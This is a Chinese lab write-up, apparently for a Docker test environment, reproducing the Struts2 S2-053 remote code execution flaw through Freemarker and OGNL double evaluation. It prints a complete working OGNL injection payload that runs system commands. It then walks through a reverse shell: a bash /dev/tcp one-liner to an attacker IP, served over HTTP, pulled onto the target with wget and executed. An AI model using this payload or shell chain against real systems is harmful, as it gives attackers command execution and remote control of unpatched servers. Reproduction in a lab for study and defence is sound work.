# S2-053 远程代码执行漏洞

## 测试环境搭建

```plain
docker compose up -d
```

环境运行后，访问http://your-ip:8080/hello.action即可看到一个提交页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780920354614-7b0f48c5-6858-44f3-b0aa-caf19ba99614.png)

## 漏洞复现

Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。

输入如下Payload即可成功执行命令：

```plain
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780920354662-d8b1afea-37da-4da4-8df0-998c4c6fbb5d.png)

说明：有的同学说无法复现漏洞，经过我的测试，我发现上述Payload末尾的**换行**不能掉（也就是说payload后面必须跟一个换行，虽然我也不知道为什么），再发送即可成功。

### 反弹shell

编写shell脚本并启动http服务器：

```plain
echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
python3环境下：python -m http.server 80
```

上传shell.sh文件的命令为：

```plain
wget 192.168.174.128/shell.sh
```

上传shell.sh文件的Payload为：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780920354796-5c57faa3-9231-4ec4-bb41-946735a62e22.png)

执行shell.sh文件的命令为：

```plain
bash shell.sh
```

执行shell.sh文件的Payload为：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780920354781-8428aeda-d3b7-4757-a91f-9978a4b196c5.png)

成功接收反弹shell：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780920354615-1d48261f-880c-420d-975b-c1006ba9a2fa.png)